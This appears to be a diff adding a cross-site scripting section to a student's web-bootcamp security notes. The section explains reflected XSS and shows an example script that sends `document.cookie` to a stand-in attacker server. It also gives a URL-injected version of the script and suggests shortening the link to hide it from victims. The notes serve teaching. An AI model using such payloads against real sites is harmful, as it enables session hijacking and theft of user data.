@@ -88,3 +88,43 @@ app.use(mongoSanitize({
 ![img2](https://github.com/Brian-E-Nguyen/Web-Dev-Bootcamp-2020/blob/58-YelpCamp-Security/58-YelpCamp-Security/img-for-notes/img2.jpg?raw=true)
 
 ![img3](https://github.com/Brian-E-Nguyen/Web-Dev-Bootcamp-2020/blob/58-YelpCamp-Security/58-YelpCamp-Security/img-for-notes/img3.jpg?raw=true)
+
+## 2. Cross-Site Scripting (XSS)
+
+The next type of vulnerability we will briefly talk about is **Cross-Site Scripting (XSS)**. This is a common and potentially very powerful vulnerability. The idea is to inject some client-side script into someone else's web app. The script usually does something bad, like stealing cookies, making users do things they don't want to, or accessing user information. Cross-site scripting makes up roughly 84% of all security vulnerabilities. We will not go into a whole lot detail on it.
+
+There's is this one game called _XSS Game_ that introduces the idea of XSS.
+
+- https://xss-game.appspot.com/
+
+On the first level, the website wants us to enter a query in the search bar
+
+![img4](https://github.com/Brian-E-Nguyen/Web-Dev-Bootcamp-2020/blob/58-YelpCamp-Security/58-YelpCamp-Security/img-for-notes/img4.jpg?raw=true)
+
+![img5](https://github.com/Brian-E-Nguyen/Web-Dev-Bootcamp-2020/blob/58-YelpCamp-Security/58-YelpCamp-Security/img-for-notes/img5.jpg?raw=true)
+
+The website displays the query directly in the document, and that's important because we can add our own tags
+
+![img6](https://github.com/Brian-E-Nguyen/Web-Dev-Bootcamp-2020/blob/58-YelpCamp-Security/58-YelpCamp-Security/img-for-notes/img6.jpg?raw=true)
+
+![img7](https://github.com/Brian-E-Nguyen/Web-Dev-Bootcamp-2020/blob/58-YelpCamp-Security/58-YelpCamp-Security/img-for-notes/img7.jpg?raw=true)
+
+The website is directly taking our query and embedding it into the HTML document
+
+![img8](https://github.com/Brian-E-Nguyen/Web-Dev-Bootcamp-2020/blob/58-YelpCamp-Security/58-YelpCamp-Security/img-for-notes/img8.jpg?raw=true)
+
+![img9](https://github.com/Brian-E-Nguyen/Web-Dev-Bootcamp-2020/blob/58-YelpCamp-Security/58-YelpCamp-Security/img-for-notes/img9.jpg?raw=true)
+
+One thing that you can access through JS are cookies. A lot of people with have their cookies under `document.cookies`. If you can inject a script like the one below, you can take that information from a single user and send it to somewhere else. On the script below, it's saying that we are making a new image element. Whenever we set the `src` of an image, your browser is sending a request.
+
+```html
+<script>
+new Image().src='mybadserver/hacker?output='+document.cookie;
+</script>
+```
+
+So if we have that script in a URL, we can shorten it so that no one sees it. When we send this link out to people and the click on it, we can retrieve their information
+
+```
+yourwebsite.com?name<script>new Image().src='mybadserver/hacker?output='+document.cookie;</script>
+```
